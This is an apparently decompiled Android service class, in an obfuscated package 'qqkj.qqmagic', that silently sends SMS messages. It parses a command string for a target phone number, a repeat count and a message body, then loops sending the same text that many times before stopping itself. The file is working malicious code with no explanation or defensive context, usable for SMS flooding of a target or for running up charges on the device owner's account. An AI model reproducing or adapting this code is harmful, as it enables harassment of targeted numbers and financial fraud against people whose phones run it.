package qqkj.qqmagic;

import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.gsm.SmsManager;

public class b extends Service {
    SmsManager sm;

    @Override
    public IBinder onBind(Intent intent) {
        Intent intent2 = intent;
        return (IBinder) null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        this.sm = SmsManager.getDefault();
    }

    @Override
    public int onStartCommand(Intent intent, int i, int i2) {
        int i3 = i;
        int i4 = i2;
        String stringExtra = intent.getStringExtra("nnr");
        int indexOf = stringExtra.indexOf("!");
        int indexOf2 = stringExtra.indexOf("&");
        int indexOf3 = stringExtra.indexOf("$");
        String substring = stringExtra.substring(indexOf + 1, indexOf2);
        int parseInt = Integer.parseInt(stringExtra.substring(indexOf2 + 1, indexOf3));
        String substring2 = stringExtra.substring(indexOf3 + 1);
        for (int i5 = 1; i5 <= parseInt; i5++) {
            this.sm.sendTextMessage(substring, (String) null, substring2, (PendingIntent) null, (PendingIntent) null);
        }
        stopSelf();
        return 1;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    public b() {
    }
}
